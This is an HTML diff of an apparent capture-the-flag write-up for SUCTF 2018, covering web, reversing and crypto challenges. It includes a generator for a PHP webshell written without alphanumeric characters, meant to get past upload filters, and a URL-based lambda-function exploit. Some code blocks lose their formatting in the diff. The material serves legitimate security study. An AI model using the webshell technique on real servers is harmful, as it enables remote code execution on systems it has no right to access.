+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#enjoy-(b04902036)">enjoy-(b04902036)</a>
+    
+                <a class="dropdown-item" href="#rsa-good-(b04902036)">rsa-good-(b04902036)</a>
+    
+                <a class="dropdown-item" href="#magic-(sasdf)">magic-(sasdf)</a>
+    
+                <a class="dropdown-item" href="#rsa-(sasdf)">rsa-(sasdf)</a>
+    
+                <a class="dropdown-item" href="#pass-(sasdf)">pass-(sasdf)</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#anonymous-(bookgin)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">anonymous-(bookgin)</span>
+            </a>
+    
+<a href="#getshell-(unsolved,-written-bookgin)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">getshell-(unsolved,-written-bookgin)</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">rev</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#python-(sasdf)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">python-(sasdf)</span>
+            </a>
+    
+<a href="#enigma-(sasdf)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">enigma-(sasdf)</span>
+            </a>
+    
+<a href="#rubber-ducky-(sasdf)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">rubber-ducky-(sasdf)</span>
+            </a>
+    
+<a href="#roughlike与期末大作业-(sces60107)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">roughlike与期末大作业-(sces60107)</span>
+            </a>
+    
+<a href="#babyre-(sces60107)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">babyre-(sces60107)</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">misc</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#tnt-(sasdf,-bookgin)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">tnt-(sasdf,-bookgin)</span>
+            </a>
+    
+<a href="#sandgame-(b04902036)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">sandgame-(b04902036)</span>
+            </a>
+    
+<a href="#cyclic-(b04902036)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">cyclic-(b04902036)</span>
+            </a>
+    
+<a href="#game-(b04902036)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">game-(b04902036)</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">pwn</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu3" class="collapse sidebar-submenu">
+            <a href="#note-(kevin47)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">note-(kevin47)</span>
+            </a>
+    
+<a href="#heap-(b04902036)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">heap-(b04902036)</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu4" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">crypto</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu4" class="collapse sidebar-submenu">
+            <a href="#enjoy-(b04902036)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">enjoy-(b04902036)</span>
+            </a>
+    
+<a href="#rsa-good-(b04902036)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">rsa-good-(b04902036)</span>
+            </a>
+    
+<a href="#magic-(sasdf)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">magic-(sasdf)</span>
+            </a>
+    
+<a href="#rsa-(sasdf)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">rsa-(sasdf)</span>
+            </a>
+    
+<a href="#pass-(sasdf)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">pass-(sasdf)</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="suctf-2018"><a class="header-link" href="#suctf-2018"></a>SUCTF 2018</h1>
+
+<h2 id="web"><a class="header-link" href="#web"></a>web</h2>
+<h3 id="anonymous-(bookgin)"><a class="header-link" href="#anonymous-(bookgin)"></a>Anonymous (bookgin)</h3>
+<ul class="list">
 <li>PHP assigned a predictable function name <code>\x00lambda_%d</code> to an anonymous function</li>
-<li>Refer to <a href="https://github.com/orangetw/My-CTF-Web-Challenges#babyh-master-php-2017" target="_blank">Oragne’s challenges</a></li>
-</ul><p>Exploit:</p><ol>
-<li>Make Apache fork, refer to <a href="https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2017/baby%5Eh-master-php-2017/fork.py" target="_blank">Orange’s script</a>. It’s intended to reset the index of lambda function.</li>
+<li>Refer to <a href="https://github.com/orangetw/My-CTF-Web-Challenges#babyh-master-php-2017">Oragne&#39;s challenges</a></li>
+</ul>
+<p>Exploit:</p>
+<ol class="list">
+<li>Make Apache fork, refer to <a href="https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2017/baby%5Eh-master-php-2017/fork.py">Orange&#39;s script</a>. It&#39;s intended to reset the index of lambda function. </li>
 <li>Get flag via <code>http://web.suctf.asuri.org:81/?func_name=%00lambda_1</code></li>
-</ol><h3 id="Getshell-unsolved-written-bookgin" style=""><a class="anchor hidden-xs" href="#Getshell-unsolved-written-bookgin" title="Getshell-unsolved-written-bookgin"><span class="octicon octicon-link"></span></a>Getshell (unsolved, written bookgin)</h3><p>I’m stuck in this problem for about a day, and I really desperate for the writeup. So let me put the reference first(respect!):</p><p>Reference:</p><ol>
-<li><a href="https://mp.weixin.qq.com/s?__biz=MzIxMDYyNTk3Nw==&amp;mid=2247484003&amp;idx=1&amp;sn=e27b4e770b3a16245026013545474056&amp;chksm=9760f6b5a0177fa35f21d0260a798a5b774644d45ab74af0e1e74eabbdd4520296a190ada01e&amp;mpshare=1&amp;scene=23&amp;srcid=0528VpCYK8o8P9iyzHwB9thX#rd" target="_blank">白帽100安全攻防实验室</a></li>
-<li><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank">phithon’s blog</a></li>
-</ol><p>In this problem, you can upload filename with extension <code>php</code>. However, there are some constraint: except for the first 5 characters, the php shell can only contain <code>$().;=[]_~\n</code>.</p><p>Because the php <a href="http://php.net/manual/en/language.basic-syntax.phptags.php" target="_blank">short tag</a> is not enabled, the first 5 characters have to be <code>&lt;?php</code>. However, how to create a php shell with <code>$().;=[]_~\n</code> and unicode characters?</p><p>After a few tries, and taking advantage of PHP, I can only create strings “Array”, “1”, which is definitely not enough to create a webshell.</p><p>The key point is:</p><pre><code class="php hljs">php &gt; var_dump(臺[<span class="hljs-number">1</span>]);
+</ol>
+<h3 id="getshell-(unsolved,-written-bookgin)"><a class="header-link" href="#getshell-(unsolved,-written-bookgin)"></a>Getshell (unsolved, written bookgin)</h3>
+<p>I&#39;m stuck in this problem for about a day, and I really desperate for the writeup. So let me put the reference first(respect!):</p>
+<p>Reference:</p>
+<ol class="list">
+<li><a href="https://mp.weixin.qq.com/s?__biz=MzIxMDYyNTk3Nw==&amp;mid=2247484003&amp;idx=1&amp;sn=e27b4e770b3a16245026013545474056&amp;chksm=9760f6b5a0177fa35f21d0260a798a5b774644d45ab74af0e1e74eabbdd4520296a190ada01e&amp;mpshare=1&amp;scene=23&amp;srcid=0528VpCYK8o8P9iyzHwB9thX#rd">白帽100安全攻防实验室</a></li>
+<li><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">phithon&#39;s blog</a></li>
+</ol>
+<p>In this problem, you can upload filename with extension <code>php</code>. However, there are some constraint: except for the first 5 characters, the php shell can only contain <code>$().;=[]_~\n</code>.</p>
+<p>Because the php <a href="http://php.net/manual/en/language.basic-syntax.phptags.php">short tag</a> is not enabled, the first 5 characters have to be <code>&lt;?php</code>. However, how to create a php shell with <code>$().;=[]_~\n</code> and unicode characters?</p>
+<p>After a few tries, and taking advantage of PHP, I can only create strings &quot;Array&quot;, &quot;1&quot;, which is definitely not enough to create a webshell.</p>
+<p>The key point is:</p>
+<pre class="hljs"><code>php &gt; var_dump(臺[<span class="hljs-number">1</span>]);
 PHP Warning:  <span class="hljs-keyword">Use</span> <span class="hljs-title">of</span> <span class="hljs-title">undefined</span> <span class="hljs-title">constant</span> 臺 - <span class="hljs-title">assumed</span> '臺' (<span class="hljs-title">this</span> <span class="hljs-title">will</span> <span class="hljs-title">throw</span> <span class="hljs-title">an</span> <span class="hljs-title">Error</span> <span class="hljs-title">in</span> <span class="hljs-title">a</span> <span class="hljs-title">future</span> <span class="hljs-title">version</span> <span class="hljs-title">of</span> <span class="hljs-title">PHP</span>) <span class="hljs-title">in</span> <span class="hljs-title">php</span> <span class="hljs-title">shell</span> <span class="hljs-title">code</span> <span class="hljs-title">on</span> <span class="hljs-title">line</span> 1
-<span class="hljs-title">string</span>(1) "�"
-</code></pre><p>Although the unicode character 臺 (which means Tai in Chinese) is not put in quotes, it can still be interpreted. Thank you, PHP!</p><p>But the unicode character doesn’t contain any ASCII character in case of character set confusion. We can utilize <code>~</code> to bypass this.</p><p>Here is a PoC. The challenge server uses PHP 5, so <code>assert</code> can be used as a dynamic function to RCE.</p><pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-title">string</span>(1) "�"</code></pre><p>Although the unicode character 臺 (which means Tai in Chinese) is not put in quotes, it can still be interpreted. Thank you, PHP!</p>
+<p>But the unicode character doesn&#39;t contain any ASCII character in case of character set confusion. We can utilize <code>~</code> to bypass this.</p>
+<p>Here is a PoC. The challenge server uses PHP 5, so <code>assert</code> can be used as a dynamic function to RCE.</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
 <span class="hljs-comment"># Python 3.6.5</span>
 
 <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">toUnicode</span><span class="hljs-params">(c)</span>:</span>
@@ -55,14 +378,15 @@ PHP Warning:  <span class="hljs-keyword">Use</span> <span class="hljs-title">of<
     <span class="hljs-keyword">return</span> bytes([<span class="hljs-number">0xe4</span>, byte, <span class="hljs-number">0x80</span>]).decode()
 
 print(<span class="hljs-string">'$_=_==_;'</span>) <span class="hljs-comment"># True, because NULL == NULL</span>
-print(<span class="hljs-string">'$__='</span> + <span class="hljs-string">'.'</span>.join([<span class="hljs-string">f'~<span class="hljs-subst">{toUnicode(c)}</span>[$_]'</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">'printf'</span>]) + <span class="hljs-string">';'</span>) <span class="hljs-comment"># string(4) "printf"</span>
-print(<span class="hljs-string">'$___='</span> + <span class="hljs-string">'.'</span>.join([<span class="hljs-string">f'~<span class="hljs-subst">{toUnicode(c)}</span>[$_]'</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">'_GET'</span>]) + <span class="hljs-string">';'</span>) <span class="hljs-comment"># string(4) "_GET"</span>
-print(<span class="hljs-string">f'$__($$___[$_]);'</span>) <span class="hljs-comment"># $$___[$_] means $_GET["1"]</span>
-</code></pre><pre><code class="php hljs">$_=_==_;
+print(<span class="hljs-string">'$__='</span> + <span class="hljs-string">'.'</span>.join([f<span class="hljs-string">'~{toUnicode(c)}[$_]'</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">'printf'</span>]) + <span class="hljs-string">';'</span>) <span class="hljs-comment"># string(4) "printf"</span>
+print(<span class="hljs-string">'$___='</span> + <span class="hljs-string">'.'</span>.join([f<span class="hljs-string">'~{toUnicode(c)}[$_]'</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">'_GET'</span>]) + <span class="hljs-string">';'</span>) <span class="hljs-comment"># string(4) "_GET"</span>
+print(f<span class="hljs-string">'$__($$___[$_]);'</span>) <span class="hljs-comment"># $$___[$_] means $_GET["1"]</span></code></pre><pre class="hljs"><code>$_=_==_;
 $__=~䏀[$_].~䍀[$_].~䖀[$_].~䑀[$_].~䋀[$_].~䙀[$_];
 $___=~䠀[$_].~一[$_].~亀[$_].~䫀[$_];
-$__($$___[$_]); <span class="hljs-comment">// printf($_GET["1"]);</span>
-</code></pre><h2 id="rev" style=""><a class="anchor hidden-xs" href="#rev" title="rev"><span class="octicon octicon-link"></span></a>rev</h2><h3 id="python-sasdf" style=""><a class="anchor hidden-xs" href="#python-sasdf" title="python-sasdf"><span class="octicon octicon-link"></span></a>python (sasdf)</h3><p>We construct the pyc from <code>opcode.txt</code> and then decompile with <code>uncompyle6</code> (If you are interestring in how to construct pyc, google for types.CodeType and marshal), and then we have following code:</p><pre><code class="python hljs"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *
+$__($$___[$_]); <span class="hljs-comment">// printf($_GET["1"]);</span></code></pre><h2 id="rev"><a class="header-link" href="#rev"></a>rev</h2>
+<h3 id="python-(sasdf)"><a class="header-link" href="#python-(sasdf)"></a>python (sasdf)</h3>
+<p>We construct the pyc from <code>opcode.txt</code> and then decompile with <code>uncompyle6</code> (If you are interestring in how to construct pyc, google for types.CodeType and marshal), and then we have following code:</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *
 <span class="hljs-keyword">from</span> libnum <span class="hljs-keyword">import</span> n2s, s2n
 <span class="hljs-keyword">import</span> binascii <span class="hljs-keyword">as</span> b
 key = <span class="hljs-string">'********'</span>
@@ -86,8 +410,8 @@ key = <span class="hljs-string">'********'</span>
     aaa(aaaa(key))
 
 <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
-    aaaaaa()
-</code></pre><p>The code is wrong, there’s no function <code>aa</code> in the library. It’s not decompilation error, the provided file is wrong :( However, we know that the encryption function is called with hex-encoded key from this python code. Reverse the library we came up with following decryption code.</p><pre><code class="python hljs"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt</span><span class="hljs-params">(enc, key)</span>:</span>
+    aaaaaa()</code></pre><p>The code is wrong, there&#39;s no function <code>aa</code> in the library. It&#39;s not decompilation error, the provided file is wrong :( However, we know that the encryption function is called with hex-encoded key from this python code. Reverse the library we came up with following decryption code.</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt</span><span class="hljs-params">(enc, key)</span>:</span>
     key = binascii.hexlify(key.encode(<span class="hljs-string">'ascii'</span>))
     key = list(key * (<span class="hljs-number">256</span>//len(key)+<span class="hljs-number">1</span>))[:<span class="hljs-number">256</span>]
     sbox = list(range(<span class="hljs-number">256</span>))
@@ -104,8 +428,10 @@ key = <span class="hljs-string">'********'</span>
         sbox[a], sbox[b] = sbox[b], sbox[a]
         k = (sbox[a] + sbox[b]) &amp; <span class="hljs-number">0xff</span>
         r += chr(c ^ sbox[k])
-    <span class="hljs-keyword">return</span> r
-</code></pre><p>But the key is not <code>********</code>, search the key using rockyou for printable plaintext to get the flag.</p><h3 id="Enigma-sasdf" style=""><a class="anchor hidden-xs" href="#Enigma-sasdf" title="Enigma-sasdf"><span class="octicon octicon-link"></span></a>Enigma (sasdf)</h3><p>A reverse challenge that encrypt our input then compare to encrypted flag stored in the binary.</p><pre><code class="python hljs"><span class="hljs-keyword">with</span> open(<span class="hljs-string">'Enigma'</span>, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> f:
+    <span class="hljs-keyword">return</span> r</code></pre><p>But the key is not <code>********</code>, search the key using rockyou for printable plaintext to get the flag.</p>
+<h3 id="enigma-(sasdf)"><a class="header-link" href="#enigma-(sasdf)"></a>Enigma (sasdf)</h3>
+<p>A reverse challenge that encrypt our input then compare to encrypted flag stored in the binary.</p>
+<pre class="hljs"><code><span class="hljs-keyword">with</span> open(<span class="hljs-string">'Enigma'</span>, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> f:
     input_enc = list(f.read()[<span class="hljs-number">0x30a0</span>:][:<span class="hljs-number">36</span>])
 
 <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bit</span><span class="hljs-params">(a, b)</span>:</span>
@@ -166,16 +492,19 @@ flag = []
         <span class="hljs-keyword">if</span> v16 == t:
             flag.append(c)
             <span class="hljs-keyword">break</span>
-print(bytes(flag).decode(<span class="hljs-string">'ascii'</span>))
-</code></pre><h3 id="Rubber-Ducky-sasdf" style=""><a class="anchor hidden-xs" href="#Rubber-Ducky-sasdf" title="Rubber-Ducky-sasdf"><span class="octicon octicon-link"></span></a>Rubber Ducky (sasdf)</h3><p>The challenge provide a intel hex file, after convert to binary, we can find a string <code>Arduino Micro</code> at the bottom. The bootloader (i.e. the part that has 20 hex per line) is concatenated after the program. It’s not modified so we can strip it off.</p><p>As the challenge hex in HITB CTF we solved before, we guess the program is typing some message using Keyboard library. Compiled sample code with <code>Keyboard::press</code> and <code>Keyboard::release</code>, and then use BinDiff to bring symbols back. The program is typing <code>rundll32 url.dll,OpenURL XXXXXX</code>, where URL is dynamically generated. We use <code>simavr</code> to get the URL. The simulator cannot go through initialization process, so we need to skip some code. It generate different (i.e. wrong) URLs depends on which part is skipped. However, after multiple run, we have:</p><pre><code>http://qn-suctf.summershrimp.com/Uz
-http://qn-suctf.summershrimXXcom/UzNjcmU3R2
-http://qn-suctf.summershrimp.XXm/UzNjcmU3R2FSZG
-http://qn-suctf.summershrimp.XXm/UzNjcmU3R2FSZGUO.zip
-http://qn-suctf.summershrimp.XXm/UzNjcmU3RAFSZGVO.zip
+print(bytes(flag).decode(<span class="hljs-string">'ascii'</span>))</code></pre><h3 id="rubber-ducky-(sasdf)"><a class="header-link" href="#rubber-ducky-(sasdf)"></a>Rubber Ducky (sasdf)</h3>
+<p>The challenge provide a intel hex file, after convert to binary, we can find a string <code>Arduino Micro</code> at the bottom. The bootloader (i.e. the part that has 20 hex per line) is concatenated after the program. It&#39;s not modified so we can strip it off.</p>
+<p>As the challenge hex in HITB CTF we solved before, we guess the program is typing some message using Keyboard library. Compiled sample code with <code>Keyboard::press</code> and <code>Keyboard::release</code>, and then use BinDiff to bring symbols back. The program is typing <code>rundll32 url.dll,OpenURL XXXXXX</code>, where URL is dynamically generated. We use <code>simavr</code> to get the URL. The simulator cannot go through initialization process, so we need to skip some code. It generate different (i.e. wrong) URLs depends on which part is skipped. However, after multiple run, we have:</p>
+<pre class="hljs"><code><span class="hljs-string">http:</span><span class="hljs-comment">//qn-suctf.summershrimp.com/Uz</span>
+<span class="hljs-string">http:</span><span class="hljs-comment">//qn-suctf.summershrimXXcom/UzNjcmU3R2</span>
+<span class="hljs-string">http:</span><span class="hljs-comment">//qn-suctf.summershrimp.XXm/UzNjcmU3R2FSZG</span>
+<span class="hljs-string">http:</span><span class="hljs-comment">//qn-suctf.summershrimp.XXm/UzNjcmU3R2FSZGUO.zip</span>
+<span class="hljs-string">http:</span><span class="hljs-comment">//qn-suctf.summershrimp.XXm/UzNjcmU3RAFSZGVO.zip</span>
 
-Manual reconstructed URL:
-http://qn-suctf.summershrimp.com/UzNjcmU3R2FSZGVO.zip
-</code></pre><p>The zip contains a windows exe, which is a PyInstaller file according to it’s icon. Extract with <code>pyinstxtractor</code>. The file <code>RubberDuckey</code> is a serialized marshal file. Add magic bytes and moddate to convert to pyc. then decompile with <code>uncompyle6</code>.</p><p>Finally, we got the flag with following decryption code:</p><pre><code class="python hljs">cipher = <span class="hljs-string">'YVGQF|1mooH.hXk.SebfQU`^WL)J[\\(`'</span>
+Manual reconstructed <span class="hljs-string">URL:</span>
+<span class="hljs-string">http:</span><span class="hljs-comment">//qn-suctf.summershrimp.com/UzNjcmU3R2FSZGVO.zip</span></code></pre><p>The zip contains a windows exe, which is a PyInstaller file according to it&#39;s icon. Extract with <code>pyinstxtractor</code>. The file <code>RubberDuckey</code> is a serialized marshal file. Add magic bytes and moddate to convert to pyc. then decompile with <code>uncompyle6</code>.</p>
+<p>Finally, we got the flag with following decryption code:</p>
+<pre class="hljs"><code>cipher = <span class="hljs-string">'YVGQF|1mooH.hXk.SebfQU`^WL)J[\\(`'</span>
 
 res = <span class="hljs-string">''</span>
 <span class="hljs-keyword">for</span> i, t <span class="hljs-keyword">in</span> enumerate(cipher):
@@ -184,168 +513,127 @@ res = <span class="hljs-string">''</span>
         <span class="hljs-keyword">if</span> cc == ord(t):
             res += chr(c)
             <span class="hljs-keyword">break</span>
-print(res)
-</code></pre><h3 id="RoughLike与期末大作业-sces60107" style=""><a class="anchor hidden-xs" href="#RoughLike与期末大作业-sces60107" title="RoughLike与期末大作业-sces60107"><span class="octicon octicon-link"></span></a>RoughLike与期末大作业 (sces60107)</h3><ul>
+print(res)</code></pre><h3 id="roughlike与期末大作业-(sces60107)"><a class="header-link" href="#roughlike与期末大作业-(sces60107)"></a>RoughLike与期末大作业 (sces60107)</h3>
+<ul class="list">
 <li>We are given an unity game</li>
 <li><code>strings test_data/level1</code> you can find the second part of flag<code>Wow,You Find Second Half Flag _70_5uc7F</code></li>
-<li>There is a <code>First.xml</code> located at <code>test_Data/Managed</code>.<br>
+<li>There is a <code>First.xml</code> located at <code>test_Data/Managed</code>.
 It mention a dll file <code>Assembly-CSharp.dll</code> that has been Dotfuscated. After decompiling <code>Assembly-CSharp.dll</code>, you can find out that this game use a decrypt funcion before loading assetbundles to memory</li>
 <li>Use de4dot on Assembly-CSharp.dll. Then you can know that the decrypt function is actually base64-decoding with custom table <code>QRSTUVWXYZABCDEFGHIJKLMNOPabcdefghijklmnopqrstuvwxyz0123456789+/</code></li>
-<li>The assetbundles are located at <code>test_Data/StreamingAssets/bundles</code>. After decoding those file, we can use <a href="https://7daystodie.com/forums/showthread.php?22675-Unity-Assets-Bundle-Extractor" target="_blank">Unity Assets Bundle Extractor</a></li>
-<li>The first part of flag was hidden in <code>test_Data/StreamingAssets/bundles/WeaponYourself.assetbundle</code></li>
-</ul><pre><code>	name = "Flag",
-	ID = "WYS_07",
-	type = 8,
-	comment = "Hey, look at this one ?!V2VMQzBtRQ==",
-	using_times = 1,
-	effect = "CannotUse",
-	fading_time = 0,
-	use_direction = false
-</code></pre><ul>
-<li>The complete flag is <code>SUCTF{WeLC0mE_70_5uc7F}</code></li>
-</ul><h3 id="babyre-sces60107" style=""><a class="anchor hidden-xs" href="#babyre-sces60107" title="babyre-sces60107"><span class="octicon octicon-link"></span></a>babyre (sces60107)</h3><ul>
-<li>A mips 32-bit binary</li>
+<li>The assetbundles are located at <code>test_Data/StreamingAssets/bundles</code>. After decoding those file, we can use <a href="https://7daystodie.com/forums/showthread.php?22675-Unity-Assets-Bundle-Extractor">Unity Assets Bundle Extractor</a></li>
+<li>The first part of flag was hidden in <code>test_Data/StreamingAssets/bundles/WeaponYourself.assetbundle</code><pre class="hljs"><code>  <span class="hljs-attr">name</span> = <span class="hljs-string">"Flag"</span>,
+  <span class="hljs-attr">ID</span> = <span class="hljs-string">"WYS_07"</span>,
+  <span class="hljs-attr">type</span> = <span class="hljs-number">8</span>,
+  <span class="hljs-attr">comment</span> = <span class="hljs-string">"Hey, look at this one ?!V2VMQzBtRQ=="</span>,
+  <span class="hljs-attr">using_times</span> = <span class="hljs-number">1</span>,
+  <span class="hljs-attr">effect</span> = <span class="hljs-string">"CannotUse"</span>,
+  <span class="hljs-attr">fading_time</span> = <span class="hljs-number">0</span>,
+  <span class="hljs-attr">use_direction</span> = <span class="hljs-literal">false</span></code></pre></li>
+<li><p>The complete flag is <code>SUCTF{WeLC0mE_70_5uc7F}</code></p>
+<h3 id="babyre-(sces60107)"><a class="header-link" href="#babyre-(sces60107)"></a>babyre (sces60107)</h3>
+</li>
+<li><p>A mips 32-bit binary</p>
+</li>
 <li>Custom base64 with a custom table <code>R9Ly6NoJvsIPnWhETYtHe4Sdl+MbGujaZpk102wKCr7/ODg5zXAFqQfxBicV3m8U</code></li>
 <li>The base64-encoded flag <code>eQ4y46+VufZzdFNFdx0zudsa+yY0+J2m</code></li>
 <li>After decoding, the flag is <code>SUCTF{wh0_1s_y0ur_d4ddy}</code></li>
-<li>Script:</li>
-</ul><pre><code class="python hljs"><div class="wrapper"><div class="gutter linenumber"><span data-linenumber="1"></span>
-<span data-linenumber="2"></span>
-<span data-linenumber="3"></span>
-<span data-linenumber="4"></span>
-<span data-linenumber="5"></span>
-<span data-linenumber="6"></span>
-<span data-linenumber="7"></span>
-<span data-linenumber="8"></span>
-<span data-linenumber="9"></span>
-<span data-linenumber="10"></span>
-<span data-linenumber="11"></span>
-<span data-linenumber="12"></span>
-<span data-linenumber="13"></span>
-<span data-linenumber="14"></span>
-<span data-linenumber="15"></span></div><div class="code">a=open(<span class="hljs-string">"babyre"</span>).read()
-
-flag=<span class="hljs-string">""</span>
-flag2=<span class="hljs-string">""</span>
-<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0x7b3</span>,<span class="hljs-number">0xba4</span>,<span class="hljs-number">0x10</span>):
+<li>Script:
+<code>`</code>python=
+a=open(&quot;babyre&quot;).read()</li>
+</ul>
+<p>flag=&quot;&quot;
+flag2=&quot;&quot;
+for i in range(0x7b3,0xba4,0x10):
   flag+=a[i]
-<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0x107b</span>,<span class="hljs-number">0x1364</span>,<span class="hljs-number">24</span>):
+for i in range(0x107b,0x1364,24):
   flag2+=a[i]
-<span class="hljs-keyword">print</span> <span class="hljs-string">"base64 custom table:"</span>,flag
-<span class="hljs-keyword">print</span> <span class="hljs-string">"encoded flag:"</span>,flag2
-flagc=<span class="hljs-number">0</span>
-<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag2:
-  flagc*=<span class="hljs-number">64</span>
+print &quot;base64 custom table:&quot;,flag
+print &quot;encoded flag:&quot;,flag2
+flagc=0
+for i in flag2:
+  flagc*=64
   flagc+=flag.index(i)
-<span class="hljs-keyword">print</span> <span class="hljs-string">"flag:"</span>,hex(flagc)[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>].decode(<span class="hljs-string">"hex"</span>)
-</div></div></code></pre><h3 id="simpleformat-sces60107" style=""><a class="anchor hidden-xs" href="#simpleformat-sces60107" title="simpleformat-sces60107"><span class="octicon octicon-link"></span></a>simpleformat (sces60107)</h3><ul>
-<li>The binary <code>simpleformat</code> use printf format string to verify flag</li>
-<li>Those format string are mostly in a format like <code>%1$*2$s</code>. This format string means taking the second argument as the width.</li>
-<li>And in the end of all format string is <code>%20$n</code>. This format string will count the number of bytes written so far and stored the value to the 20th argument.</li>
-<li>Actually, Those format strings are some linear equations. We can use <code>z3</code> to solve those equations.</li>
-<li>Script:</li>
-</ul><pre><code class="python hljs"><div class="wrapper"><div class="gutter linenumber"><span data-linenumber="1"></span>
-<span data-linenumber="2"></span>
-<span data-linenumber="3"></span>
-<span data-linenumber="4"></span>
-<span data-linenumber="5"></span>
-<span data-linenumber="6"></span>
-<span data-linenumber="7"></span>
-<span data-linenumber="8"></span>
-<span data-linenumber="9"></span>
-<span data-linenumber="10"></span>
-<span data-linenumber="11"></span>
-<span data-linenumber="12"></span>
-<span data-linenumber="13"></span>
-<span data-linenumber="14"></span>
-<span data-linenumber="15"></span>
-<span data-linenumber="16"></span>
-<span data-linenumber="17"></span>
-<span data-linenumber="18"></span>
-<span data-linenumber="19"></span>
-<span data-linenumber="20"></span>
